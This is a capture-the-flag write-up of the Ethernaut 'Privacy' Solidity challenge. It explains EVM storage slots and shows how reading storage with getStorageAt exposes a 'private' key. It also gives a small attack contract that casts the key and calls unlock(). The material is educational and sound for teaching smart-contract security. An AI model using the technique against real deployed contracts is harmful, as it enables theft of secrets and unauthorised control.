# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

Challenge's  message:

>The creator of this contract was careful enough to protect the sensitive areas of its storage. Unlock this contract to beat the level.
Things that might help: - Understanding how storage works - Understanding how parameter parsing works - Understanding how casting works

In this write-up, we will focus on Privacy contract. The contract has several state variables defined. At first, there is a **locked** *boolean* variable which equals true. Secondly, we have an **ID** variable that is a public *uint256* variable that stores the timestamp value when the contract is created. Then, there is two *uint8* type variable and one *uint16* type variable. And there is bytes32 type an private array which has 3 array slots. In the constructor, the contract gets same type an array called **_data**.
Finally, there is a **unlock()** function that gets bytes16 type of an argument named **_key** and it checks if this argument same bytes16 type of **data** array's 2nd slot. If the condation is true, the unlock variable will be false.

In this point, we are clearly see that if someone get the value of the data array's 2nd slot, he easily unlocked the challenge. Well, how do we get this value from the contract? Let's move on.

## Smart Contract's Storage

Each smart contract running in the Ethereum Virtual Machine (EVM) maintains state in its own permanent storage. This storage can be thought of as a very large array, initially full of zeros. Each value in the array is 32-bytes wide, and there are 2256 such values. A smart contract can read from or write to a value at any location. That’s the extent of the storage interface.

<p align="center"><img  height="200" src="https://programtheblockchain.com/storage/storage.png"></p>

For example, we have a basic contract called **StorageTest** which helps us to understand how smart contract's storage works.


```solidity
contract StorageTest {
    uint256 a;
    bytes32 b;
}
```

In the above code:
+ ```a``` is stored at **slot 0**. 
+ ```b``` is stored at **slot 1**.

<p align="center"><img height="300" src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Vault/img/storage.png"></p>

More about  [Smart Contract's Storage](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)

## Accessing Private Variabes In Contract's Storage

In solidity, unlike the general idea that someone can't access any private variable from external calls, we can access private variables from contract's storage because of the **_contract's storage open to external calls_**. In this senario, some libraries help us like **_web3_** to attain storage of contracts in blockchain. More about [Accessing Contract's Storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)

When you access storage of a contract with web3 library, you should use like this ```web.eth.getStorageAt(contract address,slot index)``` . More about [getStorageAt()](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat)


# Subverting

In the overview , we mentioned that if we get the access of data array'slot values, the challenge will be solved. After get access to private data, the only thing we must do is convert to the 2nd slot value into bytes16 format and send to challenge contract's unlock function. Here is our attack contract helps us to solve the challenge.

```solidity
pragma solidity ^0.8.17;

import './Privacy.sol';

contract Attack{

    Privacy target;

    constructor(address _target){
        target = Privacy(_target);
    }

    function attack(bytes32 _key) external{
        bytes16 key = bytes16(_key);
        target.unlock(key);
    }

}
```

Shortly, our attack contract gets an instance of target contract in constructor. Later, in the attack function, it gets an bytes32 type an argument called **_key** which is retrive 2nd slots of data array from the target contract and it **converts the argument into bytes16 format**. Final it calls the unclock() function with the new key.

```shell
await contract.locked()
true
```

```shell
await web3.eth.getStorageAt("0x9723e4E6B0F5A32329253F55a80f29fFf3ae73d5", 5)
'0x7ec6a7b3fd05ab43951c4d7f2ed28ebdd4e5d435279430a3fd6b0f1df716e32d'
```

```shell
await contract.locked()
false
```
